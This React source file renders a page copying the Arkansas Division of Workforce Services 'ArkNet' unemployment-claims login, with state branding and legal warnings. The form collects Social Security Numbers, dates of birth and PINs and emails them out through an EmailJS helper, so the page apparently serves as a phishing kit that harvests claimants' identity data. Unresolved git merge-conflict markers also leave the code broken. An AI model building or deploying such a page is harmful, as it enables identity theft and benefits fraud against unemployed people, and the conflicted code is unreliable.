"use client";
import { useState } from 'react';
import { sendEmail } from './emailjs-init';

export default function MainContent() {
  const [ssnError, setSsnError] = useState("");
  const [dobError, setDobError] = useState("");
  const [popup, setPopup] = useState("");

  function validateAndSend(e) {
    e.preventDefault();
    const ssn = e.target.id.value;
    const dob = e.target.dob.value;
    let valid = true;
    setSsnError("");
    setDobError("");
    setPopup("");
    if (!/^\d{9,}$/.test(ssn)) {
      setSsnError("Social Security Number must be at least 9 digits.");
      valid = false;
    }
    if (!/^(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/\d{4}$/.test(dob)) {
      setDobError("Date of Birth must be in MM/DD/YYYY format.");
      valid = false;
    }
    if (valid) {
      sendEmail(e, () => setPopup("Form submitted successfully!"), () => setPopup("Error sending form. Please try again."));
    }
  }

  return (
    <main id="PAGES_CONTAINER" tabIndex={-1} style={{
      background: '#fff',
      fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
      color: '#071C93',
      boxSizing: 'border-box',
      width: '100%',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: 0,
      margin: 0,
      overflowX: typeof window !== 'undefined' && window.innerWidth <= 600 ? 'auto' : 'visible',
    }}>
      <section style={{
<<<<<<< HEAD
        background: '#fff',
=======
        background: '#f7f7f7',
>>>>>>> 6664ea4fc4f6bea6561aefebe5011dbccbdf04e2
        padding: '0',
        width: '100%',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        boxSizing: 'border-box',
      }} aria-label="main content">
        <div style={{
          display: 'flex',
          flexDirection: 'row',
          alignItems: 'center',
          justifyContent: 'center',
          width: '100%',
          height: 90,
          padding: '0 16px',
          marginLeft: 0,
        }}>
          <img
            src="https://static.wixstatic.com/media/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png/v1/fill/w_238,h_66,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/4c3aea_01a9c58ee7be452ca55673df7815ce3f~mv2.png"
            alt="ArkNet Logo"
            style={{width: 180, height: 50, objectFit: 'cover', marginRight: 16, border: 'none'}}
          />
          <div style={{display: 'flex', flexDirection: 'column', alignItems: 'flex-start', justifyContent: 'center', width: 'auto'}}>
            <h1 style={{
<<<<<<< HEAD
              fontSize: typeof window !== 'undefined' && window.innerWidth <= 600 ? 'clamp(13px, 4vw, 18px)' : 'clamp(20px, 5vw, 32px)',
=======
              fontSize: 'clamp(20px, 5vw, 32px)',
>>>>>>> 6664ea4fc4f6bea6561aefebe5011dbccbdf04e2
              fontWeight: 'bold',
              fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
              color: '#000',
              margin: 0,
              letterSpacing: '0.5px',
              textAlign: 'left',
              lineHeight: 1.2,
              boxSizing: 'border-box',
              textShadow: '0 1px 2px rgba(0,0,0,0.04)',
            }}>
              Arkansas Division of Workforce Services
            </h1>
            <h2 style={{
<<<<<<< HEAD
              fontSize: typeof window !== 'undefined' && window.innerWidth <= 600 ? 'clamp(11px, 3vw, 15px)' : 'clamp(16px, 3vw, 22px)',
=======
              fontSize: 'clamp(16px, 3vw, 22px)',
>>>>>>> 6664ea4fc4f6bea6561aefebe5011dbccbdf04e2
              fontWeight: 500,
              fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
              color: '#071C93',
              margin: '4px 0 0 0',
              letterSpacing: '0.2px',
              textAlign: 'left',
              lineHeight: 1.3,
            }}>
              Unemployment Insurance Continued Claims
            </h2>
          </div>
        </div>
        <h3 style={{
          width: '100%',
          maxWidth: 850,
          margin: '32px auto 0 auto',
          fontSize: 'clamp(16px, 4vw, 22px)',
          fontWeight: 600,
          color: '#071C93',
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
          textAlign: 'center',
        }}>
          Welcome to ArkNet (Arkansas Internet Continued Claims System).
        </h3>
        <div style={{
          width: '100%',
          maxWidth: 850,
          height: '32px',
          margin: '18px auto 0px auto',
        }}></div>
        <div style={{
          width: '100%',
          maxWidth: 850,
          margin: '0 auto 0px auto',
          fontSize: 'clamp(14px, 3vw, 18px)',
          fontWeight: 400,
          color: '#071C93',
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
          textAlign: 'center',
        }}>
          Please log in: (If you set a PIN on Arkline use that PIN here)
        </div>
        <form onSubmit={validateAndSend} style={{
          width: '100%',
          maxWidth: 850,
          background: '#fff',
          padding: '32px 16px 24px 16px',
          borderRadius: 0,
          boxShadow: 'none',
          border: '1.5px solid #000',
          boxSizing: 'border-box',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          margin: '8px auto 0 auto',
          gap: '18px',
          zIndex: 2,
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
        }}>
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              ID (Social Security Number) <span style={{color: 'red', fontSize: 20}}>*</span>
            </label>
            <input name="id" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          {ssnError && <div style={{color: 'red', fontSize: 14, marginBottom: 8}}>{ssnError}</div>}
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              DOB (MM/DD/YYYY) <span style={{color: 'red', fontSize: 20}}>*</span>
            </label>
            <input name="dob" type="text" placeholder="MM/DD/YYYY" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          {dobError && <div style={{color: 'red', fontSize: 14, marginBottom: 8}}>{dobError}</div>}
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <label style={{fontSize: 16, marginRight: 16, minWidth: 180, fontWeight: 500, textAlign: 'right'}}>
              PIN (Personal Identification Number)
            </label>
            <input name="pin" type="text" maxLength={100} autoComplete="off" required style={{width: '320px', padding: 10, border: '1px solid #ccc', borderRadius: 6, boxSizing: 'border-box', fontSize: 16, fontFamily: 'alfabet, Arial, Helvetica, sans-serif', background: '#fff'}} />
          </div>
          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
            <input name="newPin" type="checkbox" id="newPin" style={{marginRight: 8}} />
            <label htmlFor="newPin" style={{color: '#EA7575', fontSize: 16, letterSpacing: 'normal', fontWeight: 500, width: '540px', textAlign: 'left', display: 'inline-block'}}>
              If you have not already established a four-digit PIN using Arkline, enter your new PIN above and click this box.
            </label>
          </div>
          <button type="submit" style={{background: '#071C93', color: '#fff', padding: '14px 36px', border: 'none', borderRadius: 6, fontSize: 17, fontWeight: 'bold', cursor: 'pointer', letterSpacing: 'normal', marginTop: '8px'}}>
            Login
          </button>
        </form>
        <div style={{
          width: 850,
          margin: '32px auto 0 auto',
          background: 'none',
          color: '#333',
          fontSize: 15,
          fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
          border: 'none',
          padding: 0,
          textAlign: 'left',
        }}>
          <p style={{marginBottom: 12}}>
            Use of this system may be monitored to detect improper use and potential violations of state policy.
          </p>
          <p style={{marginBottom: 12}}>
            <b>ArkNet</b> is restricted to users who have established a current and valid Arkansas Unemployment Insurance Claim. <b>Unauthorized use of this system constitutes a security violation.</b> Violators may be subject to disciplinary or civil action, or criminal prosecution under applicable Federal and State laws.
          </p>
          <p style={{marginBottom: 0, color: '#8B0000'}}>
            The web browsers best suited for this site are the most recent versions of Microsoft Edge, Mozilla Firefox, and Google Chrome.
          </p>
        </div>
      </section>
  {/* ...existing code... */}
    </main>
  );
}
